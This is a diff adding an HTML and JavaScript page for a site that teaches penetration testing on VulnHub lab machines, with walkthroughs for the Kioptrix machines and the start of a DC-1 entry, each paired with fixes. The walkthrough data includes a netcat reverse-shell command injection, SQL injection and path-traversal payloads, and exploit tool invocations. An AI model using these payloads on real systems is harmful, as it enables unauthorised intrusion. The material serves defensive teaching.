@@ -1,0 +1,527 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>makemistakescyb</title>
+<style>
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
+:root{
+--bg1:#0a0e17;--bg2:#111827;--bg3:#1a2235;--bg4:#1f2a40;--bg5:#0d1321;
+--t1:#e2e8f0;--t2:#94a3b8;--t3:#64748b;
+--green:#10b981;--blue:#3b82f6;--purple:#8b5cf6;--red:#ef4444;--orange:#f59e0b;--cyan:#06b6d4;--pink:#ec4899;
+--border:#1e293b;--border2:#334155;
+--g1:linear-gradient(135deg,#10b981,#3b82f6);
+--g2:linear-gradient(135deg,#8b5cf6,#ec4899);
+--g3:linear-gradient(135deg,#f59e0b,#ef4444);
+--r:12px;--rs:8px;--rl:16px;
+}
+html{scroll-behavior:smooth}
+body{font-family:'Segoe UI',system-ui,sans-serif;background:var(--bg1);color:var(--t1);line-height:1.6;overflow-x:hidden}
+a{color:var(--blue);text-decoration:none}
+a:hover{text-decoration:underline}
+code{font-family:'Consolas',monospace;background:var(--bg5);padding:2px 8px;border-radius:4px;font-size:.88em;color:var(--green)}
+pre{background:var(--bg5);padding:14px;border-radius:var(--rs);overflow-x:auto;border:1px solid var(--border);margin:10px 0;font-size:.84em;line-height:1.5}
+pre code{padding:0;background:none}
+
+.bg-grid{position:fixed;inset:0;background-image:linear-gradient(rgba(16,185,129,.03) 1px,transparent 1px),linear-gradient(90deg,rgba(16,185,129,.03) 1px,transparent 1px);background-size:50px 50px;pointer-events:none;z-index:0}
+
+/* NAV */
+.nav{position:fixed;top:0;left:0;right:0;background:rgba(10,14,23,.95);backdrop-filter:blur(20px);border-bottom:1px solid var(--border);z-index:1000;padding:0 24px}
+.nav-in{max-width:1400px;margin:0 auto;display:flex;align-items:center;justify-content:space-between;height:60px}
+.logo{display:flex;align-items:center;gap:10px;font-size:1.25em;font-weight:800;cursor:pointer}
+.logo-i{width:34px;height:34px;background:var(--g1);border-radius:10px;display:flex;align-items:center;justify-content:center;font-size:1.1em}
+.logo span{color:var(--green)}
+.nav-links{display:flex;gap:2px;list-style:none}
+.nav-links a{padding:8px 14px;border-radius:var(--rs);color:var(--t2);font-weight:500;font-size:.92em;cursor:pointer;text-decoration:none;display:flex;align-items:center;gap:5px;transition:.2s}
+.nav-links a:hover,.nav-links a.active{color:var(--t1);background:var(--bg3);text-decoration:none}
+.nav-links a.active{color:var(--green)}
+.btn{padding:8px 18px;border-radius:var(--rs);border:none;font-weight:600;font-size:.88em;cursor:pointer;transition:.2s;display:inline-flex;align-items:center;gap:6px}
+.btn-p{background:var(--g1);color:#fff}.btn-p:hover{transform:translateY(-1px);box-shadow:0 0 20px rgba(16,185,129,.3)}
+.btn-s{background:var(--bg3);color:var(--t1);border:1px solid var(--border2)}.btn-s:hover{border-color:var(--green)}
+.btn-lg{padding:13px 30px;font-size:1em;border-radius:var(--r)}
+
+/* PAGES */
+.main{position:relative;z-index:1;padding-top:60px;min-height:100vh}
+.page{display:none}.page.active{display:block}
+.container{max-width:1400px;margin:0 auto;padding:0 24px}
+
+/* HERO */
+.hero{padding:70px 0 50px;text-align:center;position:relative}
+.hero::before{content:'';position:absolute;top:-80px;left:50%;transform:translateX(-50%);width:500px;height:500px;background:radial-gradient(circle,rgba(16,185,129,.07) 0%,transparent 70%);pointer-events:none}
+.hero h1{font-size:3em;font-weight:900;line-height:1.15;margin-bottom:18px}
+.hero h1 .hl{background:var(--g1);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
+.hero p{font-size:1.15em;color:var(--t2);max-width:680px;margin:0 auto 32px}
+.hero-btns{display:flex;gap:14px;justify-content:center;flex-wrap:wrap}
+.hero-stats{display:flex;gap:40px;justify-content:center;margin-top:50px;flex-wrap:wrap}
+.hero-stat .num{font-size:2.2em;font-weight:900;background:var(--g1);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
+.hero-stat .lbl{color:var(--t3);font-size:.9em}
+
+/* SECTIONS */
+.section{padding:50px 0}
+.sec-h{margin-bottom:30px}
+.sec-h h2{font-size:1.9em;font-weight:800;margin-bottom:6px}
+.sec-h p{color:var(--t2);font-size:1em}
+
+/* GRIDS */
+.steps-g{display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:20px}
+.step-c{background:var(--bg3);border:1px solid var(--border);border-radius:var(--rl);padding:28px 20px;text-align:center;transition:.3s}
+.step-c:hover{transform:translateY(-3px);border-color:var(--green);box-shadow:0 0 20px rgba(16,185,129,.2)}
+.step-n{width:44px;height:44px;background:var(--g1);border-radius:50%;display:flex;align-items:center;justify-content:center;font-weight:900;margin:0 auto 14px}
+.step-c h3{font-size:1.05em;margin-bottom:6px}
+.step-c p{color:var(--t2);font-size:.88em}
+
+.feat-g{display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:20px}
+.feat-c{background:var(--bg3);border:1px solid var(--border);border-radius:var(--rl);padding:24px;transition:.3s}
+.feat-c:hover{border-color:var(--border2);transform:translateY(-2px)}
+.feat-i{font-size:1.8em;margin-bottom:10px}
+.feat-c h3{font-size:1.05em;margin-bottom:6px}
+.feat-c p{color:var(--t2);font-size:.88em}
+
+/* BROWSER */
+.browser{display:grid;grid-template-columns:260px 1fr;gap:24px;padding:28px 0}
+@media(max-width:900px){.browser{grid-template-columns:1fr}}
+.filters{background:var(--bg3);border:1px solid var(--border);border-radius:var(--rl);padding:20px;height:fit-content;position:sticky;top:80px}
+.fg{margin-bottom:18px}
+.fg label{display:block;font-weight:700;font-size:.8em;text-transform:uppercase;letter-spacing:.5px;color:var(--t3);margin-bottom:6px}
+.fg select,.fg input{width:100%;padding:9px 10px;background:var(--bg5);border:1px solid var(--border);border-radius:var(--rs);color:var(--t1);font-size:.9em;outline:none}
+.fg select:focus,.fg input:focus{border-color:var(--green)}
+.tag-cloud{display:flex;flex-wrap:wrap;gap:5px}
+.tag-b{padding:3px 9px;background:var(--bg5);border:1px solid var(--border);border-radius:16px;color:var(--t2);font-size:.78em;cursor:pointer;transition:.2s}
+.tag-b:hover,.tag-b.on{background:var(--green);color:#fff;border-color:var(--green)}
+
+.m-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:16px;flex-wrap:wrap;gap:10px}
+.m-header .cnt{color:var(--t2)}
+.m-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(300px,1fr));gap:18px}
+.m-card{background:var(--bg3);border:1px solid var(--border);border-radius:var(--rl);padding:22px;transition:.3s;cursor:pointer}
+.m-card:hover{border-color:var(--green);transform:translateY(-3px);box-shadow:0 0 20px rgba(16,185,129,.15)}
+.m-card .ct{display:flex;justify-content:space-between;align-items:flex-start;margin-bottom:10px}
+.m-card h3{font-size:1.05em;font-weight:700}
+.oscp-b{background:var(--purple);color:#fff;padding:2px 7px;border-radius:4px;font-size:.68em;font-weight:700}
+.m-card .cm{display:flex;gap:6px;flex-wrap:wrap;margin-bottom:10px}
+.badge{padding:3px 9px;border-radius:16px;font-size:.73em;font-weight:600}
+.b-easy{background:rgba(16,185,129,.15);color:var(--green)}
+.b-med{background:rgba(245,158,11,.15);color:var(--orange)}
+.b-hard{background:rgba(239,68,68,.15);color:var(--red)}
+.b-insane{background:rgba(139,92,246,.15);color:var(--purple)}
+.b-linux{background:rgba(245,158,11,.1);color:#fbbf24}
+.b-win{background:rgba(59,130,246,.1);color:var(--blue)}
+.m-card .cd{color:var(--t2);font-size:.85em;margin-bottom:12px;display:-webkit-box;-webkit-line-clamp:2;-webkit-box-orient:vertical;overflow:hidden}
+.m-card .ctags{display:flex;gap:5px;flex-wrap:wrap;margin-bottom:12px}
+.m-card .ctags span{font-size:.72em;color:var(--cyan);background:rgba(6,182,212,.1);padding:2px 7px;border-radius:4px}
+.m-card .cf{display:flex;justify-content:space-between;align-items:center;padding-top:10px;border-top:1px solid var(--border);font-size:.8em;color:var(--t3)}
+
+/* DETAIL */
+.d-hero{padding:36px 0 20px;border-bottom:1px solid var(--border);margin-bottom:28px}
+.bread{color:var(--t3);font-size:.88em;margin-bottom:10px}
+.bread a{color:var(--t2);cursor:pointer}
+.d-hero h1{font-size:2.2em;font-weight:900;margin-bottom:10px}
+.d-meta{display:flex;gap:10px;flex-wrap:wrap;margin-bottom:16px}
+.d-acts{display:flex;gap:10px;flex-wrap:wrap}
+.tabs{display:flex;gap:2px;border-bottom:1px solid var(--border);margin-bottom:28px;overflow-x:auto}
+.tab-b{padding:11px 18px;background:none;border:none;color:var(--t2);font-weight:600;font-size:.92em;cursor:pointer;border-bottom:2px solid transparent;transition:.2s;white-space:nowrap}
+.tab-b:hover{color:var(--t1)}.tab-b.on{color:var(--green);border-bottom-color:var(--green)}
+.tab-c{display:none}.tab-c.on{display:block}
+
+.s-step{background:var(--bg3);border:1px solid var(--border);border-radius:var(--r);padding:20px 20px 20px 64px;margin-bottom:14px;position:relative}
+.s-step::before{content:attr(data-n);position:absolute;left:20px;top:20px;width:30px;height:30px;background:var(--g1);border-radius:50%;display:flex;align-items:center;justify-content:center;font-weight:800;font-size:.85em}
+.s-step h3{font-size:1em;margin-bottom:6px}
+.s-step p{color:var(--t2);font-size:.9em;margin-bottom:6px}
+.warn{background:rgba(245,158,11,.1);border:1px solid rgba(245,158,11,.3);border-radius:var(--rs);padding:10px 14px;color:var(--orange);font-size:.88em;margin:10px 0}
+
+.w-phase{background:var(--bg3);border:1px solid var(--border);border-radius:var(--r);margin-bottom:14px;overflow:hidden}
+.w-head{padding:14px 20px;display:flex;justify-content:space-between;align-items:center;cursor:pointer;transition:.2s}
+.w-head:hover{background:var(--bg4)}
+.w-body{padding:0 20px 20px;display:none}
+.w-body.open{display:block}
+.w-item{padding:10px 0;border-bottom:1px solid var(--border)}
+.w-item:last-child{border:none}
+.w-item h4{font-size:.92em;margin-bottom:4px;color:var(--cyan)}
+.w-item p{color:var(--t2);font-size:.88em}
+
+.mist-c{background:var(--bg3);border:1px solid var(--border);border-radius:var(--r);padding:22px;margin-bottom:18px}
+.mist-h{display:flex;align-items:center;gap:10px;margin-bottom:14px}
+.sev{padding:3px 10px;border-radius:4px;font-size:.72em;font-weight:800;text-transform:uppercase;color:#fff}
+.sev-c{background:var(--red)}.sev-h{background:var(--orange)}.sev-m{background:var(--blue)}
+.comp{display:grid;grid-template-columns:1fr 1fr;gap:14px;margin:14px 0}
+@media(max-width:700px){.comp{grid-template-columns:1fr}}
+.wrong{background:rgba(239,68,68,.05);border:1px solid rgba(239,68,68,.2);border-radius:var(--rs);padding:14px}
+.wrong h4{color:var(--red);margin-bottom:6px}
+.right{background:rgba(16,185,129,.05);border:1px solid rgba(16,185,129,.2);border-radius:var(--rs);padding:14px}
+.right h4{color:var(--green);margin-bottom:6px}
+
+/* PATHS */
+.paths-g{display:grid;grid-template-columns:repeat(auto-fit,minmax(320px,1fr));gap:22px;padding:28px 0}
+.path-c{background:var(--bg3);border:1px solid var(--border);border-radius:var(--rl);padding:24px;transition:.3s;position:relative;overflow:hidden}
+.path-c::before{content:'';position:absolute;top:0;left:0;right:0;height:3px}
+.path-c.p1::before{background:var(--g1)}.path-c.p2::before{background:var(--g2)}.path-c.p3::before{background:var(--g3)}.path-c.p4::before{background:linear-gradient(135deg,#06b6d4,#3b82f6)}
+.path-c:hover{transform:translateY(-2px);border-color:var(--border2)}
+.path-c h3{font-size:1.15em;margin-bottom:6px}
+.path-c p{color:var(--t2);font-size:.88em;margin-bottom:14px}
+.path-m{display:flex;flex-wrap:wrap;gap:5px;margin-bottom:14px}
+.path-m span{background:var(--bg5);padding:2px 8px;border-radius:4px;font-size:.75em;color:var(--t2)}
+
+/* MISTAKES LIB */
+.ml-g{display:grid;grid-template-columns:repeat(auto-fill,minmax(320px,1fr));gap:18px;padding:28px 0}
+.ml-c{background:var(--bg3);border:1px solid var(--border);border-radius:var(--r);padding:22px;transition:.3s}
+.ml-c:hover{border-color:var(--red);transform:translateY(-2px)}
+.ml-c h3{font-size:1em;margin-bottom:6px}
+.ml-c p{color:var(--t2);font-size:.86em;margin-bottom:10px}
+.ml-c .cwe{color:var(--purple);font-size:.8em;font-weight:600}
+
+/* DASHBOARD */
+.dash-g{display:grid;grid-template-columns:repeat(4,1fr);gap:18px;padding:28px 0}
+@media(max-width:900px){.dash-g{grid-template-columns:repeat(2,1fr)}}
+@media(max-width:500px){.dash-g{grid-template-columns:1fr}}
+.st-c{background:var(--bg3);border:1px solid var(--border);border-radius:var(--r);padding:22px;text-align:center}
+.st-c .si{font-size:1.8em;margin-bottom:6px}
+.st-c .sv{font-size:1.8em;font-weight:900;background:var(--g1);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
+.st-c .sl{color:var(--t3);font-size:.82em}
+.dash-s{background:var(--bg3);border:1px solid var(--border);border-radius:var(--rl);padding:22px;margin-bottom:20px}
+.dash-s h3{margin-bottom:14px;font-size:1.05em}
+.pbar{width:100%;height:8px;background:var(--bg5);border-radius:4px;overflow:hidden;margin:8px 0}
+.pfill{height:100%;background:var(--g1);border-radius:4px;transition:width .5s}
+
+/* FOOTER */
+.footer{background:var(--bg2);border-top:1px solid var(--border);padding:36px 0 20px;margin-top:50px}
+.f-grid{display:grid;grid-template-columns:2fr 1fr 1fr 1fr;gap:36px;margin-bottom:28px}
+@media(max-width:700px){.f-grid{grid-template-columns:1fr 1fr}}
+.footer h4{margin-bottom:10px}.footer p,.footer a{color:var(--t3);font-size:.88em}
+.footer a{display:block;padding:2px 0}.footer a:hover{color:var(--green);text-decoration:none}
+.f-bot{text-align:center;padding-top:20px;border-top:1px solid var(--border);color:var(--t3);font-size:.82em}
+
+@keyframes fadeUp{from{opacity:0;transform:translateY(16px)}to{opacity:1;transform:translateY(0)}}
+.m-card{animation:fadeUp .4s ease forwards}
+:root{color-scheme:dark}
+.nav{padding-top:env(safe-area-inset-top,0px)}
+.main{padding-top:calc(60px + env(safe-area-inset-top,0px))}
+.footer{padding-bottom:calc(20px + env(safe-area-inset-bottom,0px))}
+.nav-links a{white-space:nowrap}
+@media(max-width:900px){.nav-in{height:auto;flex-wrap:wrap;padding:8px 0;gap:6px}.nav-links{order:3;width:100%;overflow-x:auto}.nav-in>.btn{display:none}.main{padding-top:calc(104px + env(safe-area-inset-top,0px))}.filters{position:static}}
+@media(max-width:600px){.hero h1{font-size:2em}}
+</style>
+</head>
+<body>
+<div class="bg-grid"></div>
+
+<nav class="nav"><div class="nav-in">
+  <div class="logo" onclick="go('home')"><div class="logo-i">🛡️</div>make<span>mistakes</span>cyb</div>
+  <ul class="nav-links">
+    <li><a onclick="go('home')" class="active" id="n-home">🏠 Home</a></li>
+    <li><a onclick="go('vulnhub')" id="n-vulnhub">🎯 VulnHub</a></li>
+    <li><a onclick="go('paths')" id="n-paths">📚 Paths</a></li>
+    <li><a onclick="go('mistakes')" id="n-mistakes">❌ Mistakes</a></li>
+    <li><a onclick="go('dash')" id="n-dash">📊 Dashboard</a></li>
+  </ul>
+  <button class="btn btn-p" onclick="go('vulnhub')">Start Hacking 🚀</button>
+</div></nav>
+
+<div class="main">
+
+<!-- HOME -->
+<div class="page active" id="p-home"><div class="container">
+  <section class="hero">
+    <h1>Learn Cybersecurity By<br>Understanding <span class="hl">Mistakes</span></h1>
+    <p>Practice on 700+ vulnerable machines from VulnHub. Find the machine, exploit it step by step, and learn what mistakes made it possible.</p>
+    <div class="hero-btns">
+      <button class="btn btn-p btn-lg" onclick="go('vulnhub')">🎯 Browse VulnHub Machines</button>
+      <button class="btn btn-s btn-lg" onclick="go('paths')">📚 Learning Paths</button>
+    </div>
+    <div class="hero-stats">
+      <div class="hero-stat"><div class="num">700+</div><div class="lbl">Vulnerable Machines</div></div>
+      <div class="hero-stat"><div class="num">50+</div><div class="lbl">Mistake Categories</div></div>
+      <div class="hero-stat"><div class="num">5</div><div class="lbl">Learning Paths</div></div>
+      <div class="hero-stat"><div class="num">100%</div><div class="lbl">Free & Legal</div></div>
+    </div>
+  </section>
+  <section class="section"><div class="sec-h"><h2>🔄 How It Works</h2><p>Every challenge follows real-world pentesting methodology</p></div>
+    <div class="steps-g">
+      <div class="step-c"><div class="step-n">1</div><h3>🔍 Recon</h3><p>Find the target machine using Nmap, Netdiscover, ARP scanning.</p></div>
+      <div class="step-c"><div class="step-n">2</div><h3>📡 Enumeration</h3><p>Discover open ports, services, versions, directories.</p></div>
+      <div class="step-c"><div class="step-n">3</div><h3>💥 Exploitation</h3><p>Exploit SQLi, RCE, misconfigs, default credentials.</p></div>
+      <div class="step-c"><div class="step-n">4</div><h3>⬆️ Priv Esc</h3><p>Escalate to root using SUID, sudo, kernel exploits.</p></div>
+      <div class="step-c"><div class="step-n">5</div><h3>🏁 Capture Flag</h3><p>Find and submit the flag to prove compromise.</p></div>
+      <div class="step-c"><div class="step-n">6</div><h3>❌ Learn Mistakes</h3><p>Understand every mistake and how to fix it.</p></div>
+    </div>
+  </section>
+  <section class="section"><div class="sec-h"><h2>🌟 Features</h2></div>
+    <div class="feat-g">
+      <div class="feat-c"><div class="feat-i">🎯</div><h3>700+ VulnHub Machines</h3><p>Browse, filter, and practice with guided walkthroughs.</p></div>
+      <div class="feat-c"><div class="feat-i">🗺️</div><h3>Step-by-Step Guides</h3><p>Detailed walkthroughs with progressive hints.</p></div>
+      <div class="feat-c"><div class="feat-i">❌</div><h3>Mistake Analysis</h3><p>What went wrong, vulnerable code, and the fix.</p></div>
+      <div class="feat-c"><div class="feat-i">📚</div><h3>Learning Paths</h3><p>OSCP prep, web security, privesc paths.</p></div>
+      <div class="feat-c"><div class="feat-i">⚙️</div><h3>Setup Guides</h3><p>VirtualBox/VMware setup in minutes.</p></div>
+      <div class="feat-c"><div class="feat-i">📊</div><h3>Progress Tracking</h3><p>Track machines, skills, and streaks.</p></div>
+    </div>
+  </section>
+</div></div>
+
+<!-- VULNHUB -->
+<div class="page" id="p-vulnhub"><div class="container">
+  <div class="browser">
+    <aside class="filters">
+      <h3 style="margin-bottom:16px">🔍 Filters</h3>
+      <div class="fg"><label>Search</label><input type="text" id="f-search" placeholder="Kioptrix, DC-1..." oninput="doFilter()"></div>
+      <div class="fg"><label>Difficulty</label><select id="f-diff" onchange="doFilter()"><option value="all">All</option><option value="Beginner">Beginner</option><option value="Easy">Easy</option><option value="Medium">Medium</option><option value="Hard">Hard</option><option value="Insane">Insane</option></select></div>
+      <div class="fg"><label>OS</label><select id="f-os" onchange="doFilter()"><option value="all">All</option><option value="Linux">Linux</option><option value="Windows">Windows</option></select></div>
+      <div class="fg"><label>Series</label><select id="f-series" onchange="doFilter()"><option value="all">All</option><option value="Kioptrix">Kioptrix</option><option value="DC">DC</option><option value="Mr-Robot">Mr-Robot</option><option value="VulnOS">VulnOS</option><option value="SickOS">SickOS</option><option value="Standalone">Standalone</option></select></div>
+      <div class="fg"><label>Tags</label><div class="tag-cloud" id="tag-cloud"></div></div>
+      <button class="btn btn-s" style="width:100%" onclick="resetF()">Reset</button>
+    </aside>
+    <main>
+      <div class="m-header"><span class="cnt" id="m-cnt"></span>
+        <select id="f-sort" onchange="doFilter()" style="padding:7px 10px;background:var(--bg3);border:1px solid var(--border);border-radius:var(--rs);color:var(--t1)"><option value="pop">Popular</option><option value="name">Name</option><option value="easy">Easiest</option><option value="hard">Hardest</option></select>
+      </div>
+      <div class="m-grid" id="m-grid"></div>
+    </main>
+  </div>
+</div></div>
+
+<!-- DETAIL -->
+<div class="page" id="p-detail"><div class="container" id="detail-out"></div></div>
+
+<!-- PATHS -->
+<div class="page" id="p-paths"><div class="container">
+  <section class="section"><div class="sec-h"><h2>📚 Learning Paths</h2><p>Structured paths using VulnHub machines</p></div>
+    <div class="paths-g" id="paths-g"></div>
+  </section>
+</div></div>
+
+<!-- MISTAKES -->
+<div class="page" id="p-mistakes"><div class="container">
+  <section class="section"><div class="sec-h"><h2>❌ Security Mistakes Library</h2><p>Common vulnerabilities from VulnHub machines</p></div>
+    <div class="ml-g" id="ml-g"></div>
+  </section>
+</div></div>
+
+<!-- DASHBOARD -->
+<div class="page" id="p-dash"><div class="container">
+  <section class="section"><div class="sec-h"><h2>📊 Dashboard</h2><p>Track your progress</p></div>
+    <div class="dash-g">
+      <div class="st-c"><div class="si">🏆</div><div class="sv" id="d-comp">0</div><div class="sl">Completed</div></div>
+      <div class="st-c"><div class="si">⭐</div><div class="sv" id="d-pts">0</div><div class="sl">Points</div></div>
+      <div class="st-c"><div class="si">🔥</div><div class="sv" id="d-str">0</div><div class="sl">Streak</div></div>
+      <div class="st-c"><div class="si">❌</div><div class="sv" id="d-mis">0</div><div class="sl">Mistakes Learned</div></div>
+    </div>
+    <div class="dash-s"><h3>📈 Progress</h3><p style="color:var(--t2);font-size:.88em">Machines completed</p><div class="pbar"><div class="pfill" id="d-pbar" style="width:0%"></div></div><p style="color:var(--t3);font-size:.82em" id="d-ptxt">0 / 700</p></div>
+    <div class="dash-s"><h3>🎯 Skills</h3><div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:14px;margin-top:10px" id="d-skills"></div></div>
+  </section>
+</div></div>
+
+</div>
+
+<footer class="footer"><div class="container">
+  <div class="f-grid">
+    <div><h4>🛡️ makemistakescyb</h4><p>Learn cybersecurity by understanding mistakes. Practice on 700+ VulnHub machines.</p></div>
+    <div><h4>Platform</h4><a href="#" onclick="go('vulnhub')">VulnHub Machines</a><a href="#" onclick="go('paths')">Learning Paths</a><a href="#" onclick="go('mistakes')">Mistakes Library</a></div>
+    <div><h4>Resources</h4><a href="https://www.vulnhub.com" target="_blank">VulnHub.com</a><a href="https://www.kali.org" target="_blank">Kali Linux</a><a href="https://owasp.org" target="_blank">OWASP</a></div>
+    <div><h4>Legal</h4><p>All VulnHub machines belong to their authors. Educational use only.</p></div>
+  </div>
+  <div class="f-bot">© 2025 makemistakescyb. Hack responsibly. 🏴‍☠️</div>
+</div></footer>
+
+<script>
+// ===== DATA =====
+const M=[
+{id:"k1",name:"Kioptrix: Level 1",series:"Kioptrix",diff:"Beginner",ds:1,os:"Linux",tags:["web","boot2root","oscp"],oscp:true,rating:4.5,comp:12500,size:"800MB",url:"https://www.vulnhub.com/entry/kioptrix-level-1-1,22/",desc:"Classic beginner machine. Basic web and network vulnerabilities. Great starting point.",
+setup:[{t:"Download VM",d:"Get the OVA from VulnHub.",c:"wget https://download.vulnhub.com/kioptrix/KVM_Linux.zip"},{t:"Import to VirtualBox",d:"File → Import Appliance → Select .ova",c:""},{t:"Set Host-Only Network",d:"Settings → Network → Host-Only Adapter",c:""},{t:"Find Target IP",d:"Boot both VMs and discover the target.",c:"sudo netdiscover -r 192.168.56.0/24"},{t:"Start Hacking",d:"Run a full Nmap scan.",c:"nmap -sV -sC -p- <target-ip>"}],
+walk:[{ph:"🔍 Reconnaissance",st:[{t:"Network Discovery",d:"Find the target on your network.",c:"sudo netdiscover -r 192.168.56.0/24"},{t:"Port Scan",d:"Full scan with versions.",c:"nmap -sV -sC -p- -O 192.168.56.101"}]},{ph:"📡 Enumeration",st:[{t:"Web Enum",d:"Check the web server.",c:"nikto -h http://192.168.56.101"},{t:"SMB Enum",d:"Check for null sessions.",c:"enum4linux -a 192.168.56.101"},{t:"Identify Versions",d:"Apache 1.3.20, OpenSSL 0.9.6, Samba 2.2.1a — all ancient.",c:"searchsploit Apache 1.3.20"}]},{ph:"💥 Exploitation",st:[{t:"OpenSSL Exploit",d:"mod_ssl vulnerable to OpenFuck.",c:"searchsploit mod_ssl 2.8\n./OpenFuck 0x6b <ip> 443 -c 40"},{t:"Samba Exploit",d:"Samba 2.2.1a RCE.",c:"msfconsole → use exploit/linux/samba/trans2open"}]},{ph:"⬆️ Priv Esc",st:[{t:"Kernel Exploit",d:"Old kernel 2.4.x has local privesc.",c:"uname -a\nsearchsploit linux kernel 2.4"}]},{ph:"🏁 Flag",st:[{t:"Root Shell",d:"Read the flag.",c:"cat /root/flag.txt"}]}],
+mistakes:[{t:"Extremely Outdated Software",s:"Critical",cwe:"CWE-1104",w:"Running Apache 1.3.20, OpenSSL 0.9.6, Samba 2.2.1a from 2001.",r:"Keep all software updated. Use automated patch management.",f:"apt-get update && apt-get upgrade"},{t:"Unnecessary Services Exposed",s:"High",cwe:"CWE-284",w:"SMB, HTTP, HTTPS, SSH all open with no firewall.",r:"Only expose needed services. Use iptables/ufw.",f:"ufw default deny incoming\nufw allow 22,80/tcp\nufw enable"},{t:"Default Configurations",s:"High",cwe:"CWE-1188",w:"Samba null sessions, Apache version disclosure.",r:"Harden all configs. Disable null sessions.",f:"ServerTokens Prod\nServerSignature Off"}]},
+
+{id:"k2",name:"Kioptrix: Level 1.1 (#2)",series:"Kioptrix",diff:"Beginner",ds:2,os:"Linux",tags:["web","boot2root","oscp","sqli"],oscp:true,rating:4.3,comp:9800,size:"750MB",url:"https://www.vulnhub.com/entry/kioptrix-level-11-2,23/",desc:"SQL injection and command injection. Introduces web app exploitation.",
+setup:[{t:"Download",d:"Get from VulnHub.",c:""},{t:"Import",d:"VirtualBox → Import.",c:""},{t:"Network",d:"Host-Only adapter.",c:""},{t:"Find IP",d:"Discover target.",c:"sudo netdiscover -r 192.168.56.0/24"}],
+walk:[{ph:"🔍 Recon",st:[{t:"Nmap",d:"Full scan.",c:"nmap -sV -sC -p- 192.168.56.102"}]},{ph:"📡 Enum",st:[{t:"Web App",d:"Find login page.",c:"dirb http://192.168.56.102"},{t:"MySQL",d:"Port 3306 open.",c:"nmap -sV -p 3306 192.168.56.102"}]},{ph:"💥 Exploit",st:[{t:"SQL Injection",d:"Bypass login.",c:"Username: ' OR 1=1 -- -\nPassword: anything"},{t:"Command Injection",d:"Ping feature allows OS commands.",c:"127.0.0.1; nc -e /bin/bash <ip> 4444"}]},{ph:"⬆️ Priv Esc",st:[{t:"Kernel Exploit",d:"CVE-2009-2698.",c:"uname -a\nsearchsploit linux kernel 2.6"}]},{ph:"🏁 Flag",st:[{t:"Root",d:"Get flag.",c:"cat /root/congrats.txt"}]}],
+mistakes:[{t:"SQL Injection",s:"Critical",cwe:"CWE-89",w:"SELECT * FROM users WHERE user='$input'",r:"Use prepared statements with parameterized queries.",f:"$stmt=$pdo->prepare('SELECT * FROM users WHERE user=?');"},{t:"Command Injection",s:"Critical",cwe:"CWE-78",w:"system('ping '+$_POST['ip']);",r:"Validate input. Use escapeshellarg().",f:"$ip=filter_var($input,FILTER_VALIDATE_IP);"}]},
+
+{id:"k3",name:"Kioptrix: Level 1.2 (#3)",series:"Kioptrix",diff:"Easy",ds:3,os:"Linux",tags:["web","boot2root","oscp","sqli","privesc"],oscp:true,rating:4.2,comp:7600,size:"850MB",url:"https://www.vulnhub.com/entry/kioptrix-level-12-3,24/",desc:"LFI and SQL injection with gallery app. More complex privesc.",
+setup:[{t:"Download & Import",d:"Standard VulnHub setup.",c:""},{t:"Network",d:"Host-Only.",c:""},{t:"Find IP",d:"Discover.",c:"sudo arp-scan -l"}],
+walk:[{ph:"🔍 Recon",st:[{t:"Scan",d:"Nmap full scan.",c:"nmap -sV -sC -p- <ip>"}]},{ph:"📡 Enum",st:[{t:"Web App",d:"Gallery app on port 80.",c:"dirb http://<ip>"},{t:"LFI Discovery",d:"Local file inclusion in gallery.",c:"http://<ip>/gallery.php?id=1'"}]},{ph:"💥 Exploit",st:[{t:"SQL Injection",d:"Extract credentials from DB.",c:"sqlmap -u 'http://<ip>/gallery.php?id=1' --dbs"},{t:"LFI to RCE",d:"Use LFI to read /etc/passwd and get shell.",c:"http://<ip>/gallery.php?id=../../../etc/passwd"}]},{ph:"⬆️ Priv Esc",st:[{t:"SUID Binary",d:"Find misconfigured SUID.",c:"find / -perm -4000 -type f 2>/dev/null"}]},{ph:"🏁 Flag",st:[{t:"Root",d:"Capture flag.",c:"cat /root/flag.txt"}]}],
+mistakes:[{t:"Local File Inclusion",s:"Critical",cwe:"CWE-98",w:"include($_GET['page']);",r:"Whitelist allowed files. Never use user input directly.",f:"$allowed=['home','about'];\nif(in_array($_GET['p'],$allowed)) include($_GET['p'].'.php');"}]},
+
+{id:"k4",name:"Kioptrix: Level 1.3 (#4)",series:"Kioptrix",diff:"Easy",ds:3,os:"Linux",tags:["web","boot2root","oscp","sqli"],oscp:true,rating:4.1,comp:6900,size:"900MB",url:"https://www.vulnhub.com/entry/kioptrix-level-13-4,25/",desc:"Blind SQL injection and MySQL UDF privilege escalation.",
+setup:[{t:"Setup",d:"Standard VulnHub import.",c:""}],
+walk:[{ph:"🔍 Recon",st:[{t:"Scan",d:"Nmap.",c:"nmap -sV -sC <ip>"}]},{ph:"💥 Exploit",st:[{t:"Blind SQLi",d:"Extract data char by char.",c:"sqlmap -u 'http://<ip>/login' --data='user=admin&pass=test' --level=3"}]},{ph:"⬆️ Priv Esc",st:[{t:"MySQL UDF",d:"Upload shared library via MySQL.",c:"SELECT * FROM mysql.func;\n# Create UDF for sys_exec"}]},{ph:"🏁 Flag",st:[{t:"Root",d:"Get flag.",c:"cat /root/congrats.txt"}]}],
+mistakes:[{t:"Blind SQL Injection",s:"Critical",cwe:"CWE-89",w:"No input validation on login form.",r:"Parameterized queries everywhere.",f:"Use PDO with prepared statements."}]},
+
+{id:"dc1",name:"DC-1",series:"DC",diff:"Beginner",ds:2,os:"Linux",tags:["web","boot2root","oscp","sqli","privesc"],oscp:true,rating:4.6,comp:11200,size:"700MB",url:"https://www.vulnhub.com/entry/dc-1,292/",desc:"Designed for beginners. Drupal CMS with multiple flags. Great for learning web exploitation.",
